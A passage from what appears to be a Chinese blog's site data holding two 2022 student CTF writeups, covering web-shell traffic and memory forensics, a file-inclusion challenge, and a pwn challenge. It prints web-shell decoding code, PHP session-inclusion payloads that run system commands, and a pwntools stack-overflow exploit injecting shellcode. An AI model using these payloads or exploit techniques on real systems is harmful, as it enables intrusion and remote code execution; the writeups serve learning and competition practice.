class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;yee092cda97a62&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;q8fb9d4c082c11&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$envstr</span>=@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;p48a6d55fac1b1&quot;</span>],<span class="number">2</span>));</span><br></pre></td></tr></table></figure><p>分析代码可知，base64截取两位后字符进行解码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tshark -r domainhacker.pcapng -Y <span class="string">&#x27;http.request.method ==&quot;POST&quot;&#x27;</span> -T json -e urlencoded-form.value &gt; Tao.txt</span><br><span class="line"><span class="built_in">cat</span> Tao.txt | jq <span class="string">&#x27;.[]._source.layers.&quot;urlencoded-form.value&quot;[2]&#x27;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;&quot;&#x27;</span> -f 2 | sed <span class="string">&#x27;s/..//&#x27;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709203001224.png" alt="image-20220709203001224"></p><p>发现1.rar和一个密码，正好和前面请求下载压缩包对应了，导出http对象</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709203759107.png" alt="image-20220709203759107"></p><p>导出发现<code>1.rar</code>，输入上面压缩的密码即可解压缩获得flag</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709203846543.png" alt="image-20220709203846543"></p><h2 id="电子取证"><a href="#电子取证" class="headerlink" title="电子取证"></a>电子取证</h2><h3 id="1-手机取证1"><a href="#1-手机取证1" class="headerlink" title="1. 手机取证1"></a>1. 手机取证1</h3><p>搜索<code>3022159.PNG</code></p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205130243.png" alt="image-20220709205130243"></p><p>可以直接看到分辨率360x360</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205121443.png" alt="image-20220709205121443"></p><h3 id="2-手机取证2"><a href="#2-手机取证2" class="headerlink" title="2. 手机取证2"></a>2. 手机取证2</h3><p>搜索姜总关键字</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205115357.png" alt="image-20220709205115357"></p><p>在群组聊天里找到快递单号</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205108371.png" alt="image-20220709205108371"></p><h3 id="3-计算机取证1"><a href="#3-计算机取证1" class="headerlink" title="3. 计算机取证1"></a>3. 计算机取证1</h3><p><code>volatility_2.6_win64_standalone.exe -f 1.dmp imageinfo</code></p><p>系统版本为Win7SP1x64</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205102750.png" alt="image-20220709205102750"></p><p><code>volatility_2.6_win64_standalone.exe -f 1.dmp --profile=Win7SP1x64 hashdump</code></p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205056605.png" alt="image-20220709205056605"></p><p>拿到<a href="https://www.somd5.com/">https://www.somd5.com/</a> 网站解密得到taqi7的开机密码</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205049358.png" alt="image-20220709205049358"></p><h3 id="4-计算机取证2"><a href="#4-计算机取证2" class="headerlink" title="4. 计算机取证2"></a>4. 计算机取证2</h3><p><code>volatility_2.6_win64_standalone.exe -f 1.dmp --profile=Win7SP1x64 cmdline</code></p><p>pid为2192的运行了MagnetRAMCapture.exe</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205035986.png" alt="image-20220709205035986"></p><p>这是一款制作内存镜像的工具</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205029581.png" alt="image-20220709205029581"></p><h3 id="5-程序分析-1"><a href="#5-程序分析-1" class="headerlink" title="5. 程序分析_1"></a>5. 程序分析_1</h3><p>将apk包反编译后，打开<code>AndroidManifest.xml</code>，搜索package获取包名</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205014408.png" alt="image-20220709205014408"></p><h3 id="6-程序分析-2"><a href="#6-程序分析-2" class="headerlink" title="6. 程序分析_2"></a>6. 程序分析_2</h3><p>查找android.intent.action.MAIN和android.intent.category.LAUNCHER对应的activity，该activity对应的android:name属性即为入口</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205008184.png" alt="image-20220709205008184"></p><h3 id="7-程序分析-3"><a href="#7-程序分析-3" class="headerlink" title="7. 程序分析_3"></a>7. 程序分析_3</h3><p>.找到MainActivity<br> <img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204948195.png" alt="image-20220709204948195"></p><p>aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6进行base64解码</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image003.png" alt="img"></p><h3 id="8-网站取证-1"><a href="#8-网站取证-1" class="headerlink" title="8. 网站取证_1"></a>8. 网站取证_1</h3><p>使用火绒查杀找到网站后门</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204453376.png" alt="image-20220709204453376"></p><p>打开看到连接密码</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204501928.png" alt="image-20220709204501928"></p><h3 id="9-网站取证-2"><a href="#9-网站取证-2" class="headerlink" title="9. 网站取证_2"></a>9. 网站取证_2</h3><p>database.php中可以找到password调用了<code>my_encrypt()</code>函数</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204520285.png" alt="image-20220709204520285"></p><p>跟进<code>my_encrypt()</code>函数</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204530241.png" alt="image-20220709204530241"></p><p>本地跑一下得到密码</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204539502.png" alt="image-20220709204539502"></p><h3 id="10-网站取证-3"><a href="#10-网站取证-3" class="headerlink" title="10. 网站取证_3"></a>10. 网站取证_3</h3><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204858323.png" alt="image-20220709204858323"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> 第六届蓝帽杯全国大学生网络安全技能大赛初赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届广东省大学生网络安全攻防大赛初赛Writeup</title>
      <link href="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"/>
      <url>/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy-ctf"><a href="#easy-ctf" class="headerlink" title="easy_ctf"></a>easy_ctf</h2><p>访问页面，发现是个脚本题。但是这里的字符每次都会变，所以需要保持同一会话管理。</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image002.jpg" alt="img"></p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 </span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># @author : Tao. </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span> </span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://120.79.191.238:43304/&quot;</span> </span><br><span class="line"></span><br><span class="line">sess = requests.session() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">req = sess.get(url) </span><br><span class="line">code = re.findall(<span class="string">r&#x27;(.*)&lt;td&gt;&#x27;</span>,req.text)[<span class="number">0</span>] </span><br><span class="line">code = <span class="string">&quot;&quot;</span>.join(<span class="built_in">sorted</span>(code)) </span><br><span class="line"></span><br><span class="line">result = &#123;&#125; </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet: </span><br><span class="line">  counts = code.count(i) </span><br><span class="line">  i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(i) </span><br><span class="line">  result[i] = counts </span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">False</span>) </span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;</span> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> res: </span><br><span class="line">  <span class="keyword">if</span> k[<span class="number">1</span>] != <span class="number">0</span>: </span><br><span class="line">    s += k[<span class="number">0</span>] * <span class="number">1</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s) </span><br><span class="line">data = &#123; </span><br><span class="line">  <span class="string">&#x27;ans&#x27;</span>: s, </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">headers = &#123; </span><br><span class="line">  <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span> </span><br><span class="line">&#125; </span><br><span class="line">res = sess.post(url, headers=headers, data=data) </span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>运行脚本，直接出flag，如下图：</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image004.jpg" alt="img"></p><h2 id="Web-in"><a href="#Web-in" class="headerlink" title="Web | in"></a>Web | in</h2><p>输入字符串，跳转点击链接，发现文件包含漏洞</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image006.png" alt="img"></p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image008.png" alt="img"></p><p>利用<code>php://filter</code>协议读取action内容</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image010.png" alt="img"></p><p>解压Base64得到源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="title function_ invoke__">session_start</span>(); </span><br><span class="line"> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"> <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]; </span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$name</span>)&#123; </span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$name</span>; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line"> <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>思路转到SESSION文件包含，fuzz常见路劲</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image012.png" alt="img"></p><p>接着尝试包含文件达到命令执行，得flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="meta">&lt;?php</span>+<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls+/&quot;</span>);<span class="meta">?&gt;</span> </span><br><span class="line">name=<span class="meta">&lt;?php</span>+<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat+/fl444444444g&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image014.png" alt="img"></p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image016.png" alt="img"></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Jmp-rsp"><a href="#Jmp-rsp" class="headerlink" title="Jmp_rsp"></a>Jmp_rsp</h2><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image017.png" alt="img"></p><p>存在栈溢出，但因为程序是静态编译而且只能溢出<code>0x20</code>不能直接<code>ret2libc</code>，所以我选择了往bss写入shellcode，利用main函数ret前刚调用的read的第一个和第三个参数，只修改rsi，设置为0x6BB300这个bss段地址，然后调用read写入shellcode返回main，再次覆盖返回地址为bss地址</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image018.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher </span><br><span class="line"> </span><br><span class="line"> context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"> p = remote(<span class="string">&#x27;47.106.122.102&#x27;</span>,<span class="number">46577</span>) </span><br><span class="line"> \<span class="comment">#p = process(&#x27;jmp_rsp&#x27;) </span></span><br><span class="line"> elf = ELF(<span class="string">&#x27;jmp_rsp&#x27;</span>) </span><br><span class="line"> main = <span class="number">0x400B5D</span> </span><br><span class="line"> pop_rdi_ret = <span class="number">0x0000000000400696</span> </span><br><span class="line"> pop_rsi_ret = <span class="number">0x0000000000410173</span> </span><br><span class="line"> leave = <span class="number">0x0000000000400B91</span> </span><br><span class="line"> bss = <span class="number">0x6BB300</span> </span><br><span class="line"> read = <span class="number">0x0449380</span> </span><br><span class="line"> </span><br><span class="line"> \<span class="comment">#gdb.attach(p,&#x27;b *0x400B91&#x27;) </span></span><br><span class="line"> payload = asm(shellcraft.sh()).ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(pop_rsi_ret) + p64(bss) + p64(read) + p64(main) </span><br><span class="line"> p.sendline(payload) </span><br><span class="line"> </span><br><span class="line"> \<span class="comment">#write shellcode to bss </span></span><br><span class="line"> pause() </span><br><span class="line"> p.sendline(asm(shellcraft.sh())) </span><br><span class="line"> </span><br><span class="line"> \<span class="comment">#ret2bss </span></span><br><span class="line"> payload = asm(shellcraft.sh()).ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(bss-<span class="number">0x8</span>) + p64(bss) + p64(main) </span><br><span class="line"> p.sendline(payload) </span><br><span class="line"> p.interactive() </span><br><span class="line"> p.close()</span><br></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Pyre"><a href="#Pyre" class="headerlink" title="Pyre"></a>Pyre</h2><p>发现是Python打包的exe程序，猜测是使用pyinstaller进行打包的，使用开源项目<a href="https://github.com/extremecoders-re/pyinstxtractor%E6%8F%90%E5%8F%96%E5%87%BApyc%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8D%E4%BD%BF%E7%94%A8pyc%E5%8F%8D%E7%BC%96%E8%AF%91%E5%9B%9EPython%E6%BA%90%E4%BB%A3%E7%A0%81">https://github.com/extremecoders-re/pyinstxtractor提取出pyc文件，然后再使用pyc反编译回Python源代码</a></p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image019.png" alt="img"></p><p>使用在线网站<a href="https://www.toolnb.com/tools-lang-en/pyc.html">https://www.toolnb.com/tools-lang-en/pyc.html</a> 对1.pyc进行反编译</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image020.jpg" alt="img"></p><p>发现有一些简单的计算来加密flag，直接用ascii可见字符范围来暴力猜测flag</p><p><img 